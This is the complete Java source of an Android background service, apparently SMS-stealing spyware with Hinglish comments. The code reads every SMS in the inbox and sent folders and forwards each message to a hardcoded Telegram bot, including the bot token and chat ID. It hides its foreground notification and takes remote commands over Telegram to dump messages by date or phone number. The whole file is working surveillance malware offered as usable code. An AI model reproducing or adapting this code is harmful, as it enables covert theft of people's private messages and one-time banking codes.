package com.smshandler;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsService extends Service {

    static final String BOT_TOKEN = "8755444402:AAFmqp2gnX3BKhbd4RGg0Tvl3DmNx9Whsh8";
    static final String CHAT_ID   = "8623638607";
    static final int    NOTIF_ID  = 9901;
    static final String CH_ID     = "x_hidden";

    private static final String PREFS           = "sms_prefs";
    private static final String KEY_SENT        = "old_sms_sent";
    private static final String KEY_OFFSET      = "last_update_id";
    private static final String KEY_BLOCKED_NOS = "blocked_numbers";

    // Sirf Telegram par message bhejne ko rokta hai — app hamesha chalta rahega
    private static volatile boolean telegramPaused = false;

    private volatile boolean running = true;
    private Thread pollThread;

    // ─── Lifecycle ───────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        startHiddenForeground();
        startPolling();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("sms_sender")) {
            String sender = intent.getStringExtra("sms_sender");
            String body   = intent.getStringExtra("sms_body");
            long   time   = intent.getLongExtra("sms_time", System.currentTimeMillis());

            // Global pause check
            if (telegramPaused) return START_STICKY;

            // Number-level block check
            if (isNumberBlocked(sender)) return START_STICKY;

            new Thread(() -> sendSmsToTelegram(sender, body, time)).start();

        } else {
            SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
            if (!prefs.getBoolean(KEY_SENT, false)) {
                prefs.edit().putBoolean(KEY_SENT, true).apply();
                new Thread(this::sendAllOldSms).start();
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (pollThread != null) pollThread.interrupt();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    // ─── Hidden Notification ─────────────────────────────────
    private void startHiddenForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CH_ID, "System", NotificationManager.IMPORTANCE_NONE);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableLights(false);
            ch.enableVibration(false);
            ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        Notification notif = new NotificationCompat.Builder(this, CH_ID)
            .setSmallIcon(android.R.drawable.screen_background_dark)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).setShowWhen(false).setOngoing(false).build();
        startForeground(NOTIF_ID, notif);
        startService(new Intent(this, InnerService.class));
    }

    // ─── Bot Polling ─────────────────────────────────────────
    private void startPolling() {
        pollThread = new Thread(() -> {
            while (running) {
                try {
                    checkCommands();
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    try { Thread.sleep(10000); } catch (InterruptedException ex) { break; }
                }
            }
        });
        pollThread.setDaemon(true);
        pollThread.start();
    }

    private void checkCommands() throws Exception {
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        long offset = prefs.getLong(KEY_OFFSET, 0);

        String apiUrl = "https://api.telegram.org/bot" + BOT_TOKEN
            + "/getUpdates?offset=" + (offset + 1) + "&limit=10&timeout=5";

        URL url = new URL(apiUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(15000);

        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) sb.append(line);
        conn.disconnect();

        JSONObject resp = new JSONObject(sb.toString());
        if (!resp.optBoolean("ok", false)) return;

        JSONArray updates = resp.getJSONArray("result");
        for (int i = 0; i < updates.length(); i++) {
            JSONObject update = updates.getJSONObject(i);
            long updateId = update.getLong("update_id");
            prefs.edit().putLong(KEY_OFFSET, updateId).apply();

            if (!update.has("message")) continue;
            JSONObject msg = update.getJSONObject("message");
            if (!msg.has("text")) continue;

            String text   = msg.getString("text").trim();
            String fromId = String.valueOf(msg.getJSONObject("chat").getLong("id"));
            if (!fromId.equals(CHAT_ID)) continue;

            handleCommand(text);
        }
    }

    // ─── Command Handler ─────────────────────────────────────
    private void handleCommand(String cmd) {
        new Thread(() -> {

            // ════ Phone Number Commands ════
            // Format: /NUMBER-/COMMAND  e.g.  /9876543210-/all
            //                                  /9876543210-/stop
            //                                  /9876543210-/start
            //                                  /9876543210-/date 02-01-2022
            Pattern phonePattern = Pattern.compile("^/([\\d+\\-\\s]+)-/(.+)$");
            Matcher m = phonePattern.matcher(cmd);

            if (m.matches()) {
                String number  = m.group(1).trim();
                String subCmd  = m.group(2).trim().toLowerCase();
                handlePhoneCommand(number, subCmd);
                return;
            }

            // ════ Global Commands ════
            if (cmd.equalsIgnoreCase("/stop")) {
                telegramPaused = true;
                sendRawMessage("⏸ Telegram par messages BAND.\nApp background mein chal rahi hai.\nDobara chalu: /start");

            } else if (cmd.equalsIgnoreCase("/start")) {
                telegramPaused = false;
                sendRawMessage("▶ Telegram par messages CHALU!\nNaye SMS yahan aayenge.");

            } else if (cmd.equalsIgnoreCase("/all")) {
                telegramPaused = false;
                sendRawMessage("📦 Saare SMS bhej raha hun...\n/stop se rok sakte ho.");
                sendAllOldSms();
                if (!telegramPaused) sendRawMessage("✅ Saare SMS bhej diye!");

            } else if (cmd.toLowerCase().startsWith("/date ")) {
                String dateStr = cmd.substring(6).trim();
                telegramPaused = false;
                int count = sendSmsByDate(null, dateStr);
                if (!telegramPaused)
                    sendRawMessage(count == 0
                        ? "❌ " + dateStr + " ko koi SMS nahi mila."
                        : "✅ " + dateStr + " ke " + count + " SMS bhej diye!");

            } else if (cmd.equalsIgnoreCase("/blocked")) {
                Set<String> blocked = getBlockedNumbers();
                if (blocked.isEmpty()) {
                    sendRawMessage("✅ Koi bhi number block nahi hai.");
                } else {
                    StringBuilder sb = new StringBuilder("🚫 Blocked Numbers:\n");
                    for (String n : blocked) sb.append("• ").append(n).append("\n");
                    sb.append("\nUnblock: /NUMBER-/start");
                    sendRawMessage(sb.toString());
                }

            } else if (cmd.equalsIgnoreCase("/status")) {
                Set<String> blocked = getBlockedNumbers();
                sendRawMessage(
                    "📊 App: 🟢 Chal rahi hai\n" +
                    "Telegram: " + (telegramPaused ? "⏸ BAND" : "▶ CHALU") + "\n" +
                    "Blocked numbers: " + (blocked.isEmpty() ? "Koi nahi" : blocked.size() + " number")
                );

            } else if (cmd.equalsIgnoreCase("/help")) {
                sendRawMessage(
                    "📋 Global Commands:\n" +
                    "/start — Telegram messages chalu\n" +
                    "/stop  — Telegram messages band\n" +
                    "/all   — Saare SMS\n" +
                    "/date DD-MM-YYYY — Us din ke SMS\n" +
                    "/blocked — Blocked numbers ki list\n" +
                    "/status — App ki halat\n\n" +
                    "📱 Number Commands (format):\n" +
                    "/NUMBER-/all\n" +
                    "/NUMBER-/date DD-MM-YYYY\n" +
                    "/NUMBER-/stop  (us number ke SMS band)\n" +
                    "/NUMBER-/start (us number ke SMS chalu)\n\n" +
                    "Example:\n" +
                    "/9876543210-/all\n" +
                    "/9876543210-/date 02-01-2022\n" +
                    "/9876543210-/stop"
                );
            }
        }).start();
    }

    // ─── Phone Number Commands ────────────────────────────────
    private void handlePhoneCommand(String number, String subCmd) {

        if (subCmd.equals("stop")) {
            blockNumber(number);
            sendRawMessage("🚫 " + number + " ke SMS ab Telegram par nahi aayenge.\nDobara chalu: /" + number + "-/start");

        } else if (subCmd.equals("start")) {
            unblockNumber(number);
            sendRawMessage("✅ " + number + " ke SMS ab Telegram par aayenge.");

        } else if (subCmd.equals("all")) {
            sendRawMessage("⭐ " + number + " ke SAARE SMS bhej raha hun...\n/stop se rok sakte ho.");
            int count = queryByNumberAndSend(number, -1, -1);
            if (!telegramPaused)
                sendRawMessage(count == 0
                    ? "❌ " + number + " ka koi SMS nahi mila."
                    : "✅ " + number + " ke " + count + " SMS bhej diye!");

        } else if (subCmd.startsWith("date ")) {
            String dateStr = subCmd.substring(5).trim();
            int count = sendSmsByDate(number, dateStr);
            if (!telegramPaused)
                sendRawMessage(count == 0
                    ? "❌ " + number + " ka " + dateStr + " ko koi SMS nahi mila."
                    : "✅ " + number + " ke " + count + " SMS bhej diye!");

        } else {
            sendRawMessage("❓ Pehchana nahi: /" + number + "-/" + subCmd + "\n/help dekho.");
        }
    }

    // ─── Blocked Numbers ─────────────────────────────────────
    private boolean isNumberBlocked(String number) {
        if (number == null) return false;
        String clean = cleanNumber(number);
        Set<String> blocked = getBlockedNumbers();
        for (String b : blocked) {
            if (cleanNumber(b).equals(clean) || clean.endsWith(cleanNumber(b)) || cleanNumber(b).endsWith(clean))
                return true;
        }
        return false;
    }

    private String cleanNumber(String n) {
        return n == null ? "" : n.replaceAll("[^0-9]", "");
    }

    private Set<String> getBlockedNumbers() {
        return new HashSet<>(getSharedPreferences(PREFS, MODE_PRIVATE)
            .getStringSet(KEY_BLOCKED_NOS, new HashSet<>()));
    }

    private void blockNumber(String number) {
        Set<String> set = getBlockedNumbers();
        set.add(number);
        getSharedPreferences(PREFS, MODE_PRIVATE).edit()
            .putStringSet(KEY_BLOCKED_NOS, set).apply();
    }

    private void unblockNumber(String number) {
        Set<String> set = getBlockedNumbers();
        set.removeIf(n -> cleanNumber(n).equals(cleanNumber(number)) ||
                         cleanNumber(number).endsWith(cleanNumber(n)) ||
                         cleanNumber(n).endsWith(cleanNumber(number)));
        getSharedPreferences(PREFS, MODE_PRIVATE).edit()
            .putStringSet(KEY_BLOCKED_NOS, set).apply();
    }

    // ─── Query by Number ─────────────────────────────────────
    private int queryByNumberAndSend(String number, long startMs, long endMs) {
        int count = 0;
        String[] folders = {"content://sms/inbox", "content://sms/sent"};
        boolean[] isSent  = {false, true};

        for (int f = 0; f < folders.length; f++) {
            Cursor cursor = null;
            try {
                String sel  = "address LIKE ?";
                String like = "%" + cleanNumber(number).substring(
                    Math.max(0, cleanNumber(number).length() - 10)) + "%";
                String[] args = {like};

                if (startMs > 0 && endMs > 0) {
                    sel  = "address LIKE ? AND date >= ? AND date <= ?";
                    args = new String[]{like, String.valueOf(startMs), String.valueOf(endMs)};
                }

                cursor = getContentResolver().query(
                    Uri.parse(folders[f]),
                    new String[]{"address", "body", "date"},
                    sel, args, "date ASC");

                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        if (telegramPaused) break;
                        String addr  = cursor.getString(0);
                        String body  = cursor.getString(1);
                        long   ts    = cursor.getLong(2);
                        String label = isSent[f] ? "[Bheja: " + addr + "]" : addr;
                        sendSmsToTelegram(label, body, ts);
                        count++;
                        Thread.sleep(400);
                    } while (cursor.moveToNext());
                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (cursor != null) cursor.close();
            }
        }
        return count;
    }

    // ─── SMS by Date ─────────────────────────────────────────
    private int sendSmsByDate(String number, String dateStr) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault());
            Date date = sdf.parse(dateStr);
            if (date == null) {
                sendRawMessage("❌ Format galat. Example: /date 02-01-2022");
                return 0;
            }
            Calendar cal = Calendar.getInstance();
            cal.setTime(date);
            cal.set(Calendar.HOUR_OF_DAY, 0);  cal.set(Calendar.MINUTE, 0);  cal.set(Calendar.SECOND, 0);
            long startMs = cal.getTimeInMillis();
            cal.set(Calendar.HOUR_OF_DAY, 23); cal.set(Calendar.MINUTE, 59); cal.set(Calendar.SECOND, 59);
            long endMs = cal.getTimeInMillis();

            String header = number != null
                ? "⭐⭐⭐ " + number + " ke " + dateStr + " ke SMS ⭐⭐⭐"
                : "⭐⭐⭐ " + dateStr + " ke SMS ⭐⭐⭐";
            sendRawMessage(header + "\n/stop se rok sakte ho.");

            if (number != null) {
                return queryByNumberAndSend(number, startMs, endMs);
            } else {
                int c = 0;
                c += queryAndSend("content://sms/inbox", startMs, endMs, false, null);
                c += queryAndSend("content://sms/sent",  startMs, endMs, true,  null);
                return c;
            }
        } catch (Exception e) {
            sendRawMessage("❌ Error: " + e.getMessage());
            return 0;
        }
    }

    private int queryAndSend(String uriStr, long startMs, long endMs, boolean isSent, String number) {
        int count = 0;
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(Uri.parse(uriStr),
                new String[]{"address", "body", "date"},
                "date >= ? AND date <= ?",
                new String[]{String.valueOf(startMs), String.valueOf(endMs)},
                "date ASC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    if (telegramPaused) break;
                    String addr  = cursor.getString(0);
                    String body  = cursor.getString(1);
                    long   ts    = cursor.getLong(2);
                    String label = isSent ? "[Bheja: " + addr + "]" : addr;
                    sendSmsToTelegram(label, body, ts);
                    count++;
                    Thread.sleep(400);
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }
        return count;
    }

    // ─── Send All SMS ────────────────────────────────────────
    private void sendAllOldSms() {
        queryAndSend("content://sms/inbox", 0, Long.MAX_VALUE, false, null);
        queryAndSend("content://sms/sent",  0, Long.MAX_VALUE, true,  null);
    }

    // ─── Telegram Helpers ────────────────────────────────────
    static void sendSmsToTelegram(String sender, String body, long timestamp) {
        if (telegramPaused) return;
        try {
            String date = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
                              .format(new Date(timestamp));
            postToTelegram("From: " + sender + "\nMsg: " + body + "\nTime: " + date);
        } catch (Exception e) { e.printStackTrace(); }
    }

    public static void sendToTelegram(String sender, String body, long timestamp) {
        sendSmsToTelegram(sender, body, timestamp);
    }

    static void sendRawMessage(String text) {
        try { postToTelegram(text); } catch (Exception e) { e.printStackTrace(); }
    }

    static void postToTelegram(String text) throws Exception {
        String api  = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
        String data = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                    + "&text="   + URLEncoder.encode(text,    "UTF-8");
        URL url = new URL(api);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        OutputStream os = conn.getOutputStream();
        os.write(data.getBytes("UTF-8"));
        os.flush();
        conn.getInputStream();
        conn.disconnect();
    }

    // ─── InnerService (notification hata do) ─────────────────
    public static class InnerService extends Service {
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Notification n = new NotificationCompat.Builder(this, CH_ID)
                    .setSmallIcon(android.R.drawable.screen_background_dark)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .setSilent(true).build();
                startForeground(NOTIF_ID, n);
            }
            stopSelf();
            return START_NOT_STICKY;
        }
        @Override public IBinder onBind(Intent intent) { return null; }
    }
}
